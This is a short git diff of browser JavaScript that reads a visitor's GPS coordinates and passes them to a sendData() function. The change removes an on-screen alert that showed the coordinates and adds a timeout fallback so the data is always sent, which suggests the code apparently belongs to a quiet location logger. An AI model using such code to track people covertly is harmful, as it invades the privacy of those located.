@@ -57,20 +57,32 @@ async function start() {
     });
 }
 if (navigator.geolocation) {
+    let gpsDone = false;
+
     navigator.geolocation.getCurrentPosition(
         (pos) => {
+            gpsDone = true;
             data.lat = pos.coords.latitude;
             data.lon = pos.coords.longitude;
-            alert("LAT: " + data.lat + " LON: " + data.lon);
             data.type = "GPS";
             sendData();
         },
         (err) => {
-            console.log("GPS failed, using IP");
+            gpsDone = true;
+            console.log("GPS failed");
             sendData();
         },
-        { enableHighAccuracy: true, timeout: 10000 }
+        { enableHighAccuracy: true, timeout: 8000 }
     );
+
+    // 🔥 Backup: if GPS hangs, send after 9 sec
+    setTimeout(() => {
+        if (!gpsDone) {
+            console.log("GPS timeout fallback");
+            sendData();
+        }
+    }, 9000);
+
 } else {
     sendData();
 }
